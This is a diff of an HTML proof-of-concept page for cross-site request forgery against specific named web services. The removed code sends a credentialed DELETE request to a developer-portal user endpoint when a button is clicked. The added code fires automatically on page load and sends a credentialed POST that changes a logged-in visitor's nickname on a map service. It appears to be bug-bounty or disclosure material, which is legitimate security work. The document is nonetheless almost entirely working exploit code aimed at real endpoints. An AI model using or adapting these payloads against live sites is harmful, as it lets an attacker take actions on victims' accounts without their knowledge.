@@ -3,33 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF POC</title>
+    <title>CSRF JSON POC</title>
 </head>
 <body>
-    <h1>CSRF Proof of Concept</h1>
-    <p>If the victim clicks the button, their session might be exploited.</p>
-    <button onclick="sendCSRF()">Trigger CSRF</button>
-
+    <h1>CSRF JSON POC</h1>
+    <p>If the victim is logged in and visits this page, their nickname will be changed.</p>
     <script>
-        function sendCSRF() {
-            fetch("https://developerportal.epiroc.com/developer/users/6772c1c8ba32ea163c145b04?api-version=2022-04-01-preview", {
-                method: "DELETE",
-                credentials: "include" // Ensures victim's cookies are sent with the request
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("CSRF attack successful!");
-                } else {
-                    response.text().then(text => {
-                        alert("CSRF failed with response: " + text);
-                    });
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("An error occurred. Check the console for details.");
-            });
-        }
+        // Craft the JSON payload
+        const data = {
+            "showAvatar": false,
+            "type": "NICK",
+            "nickname": "csrf"
+        };
+
+        // Create and send the malicious POST request
+        fetch("https://service.mapcreator.here.com/service-mapcreator/usersettings/nickname", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify(data),
+            credentials: "include" // Include cookies to simulate victim's session
+        });
     </script>
 </body>
 </html>
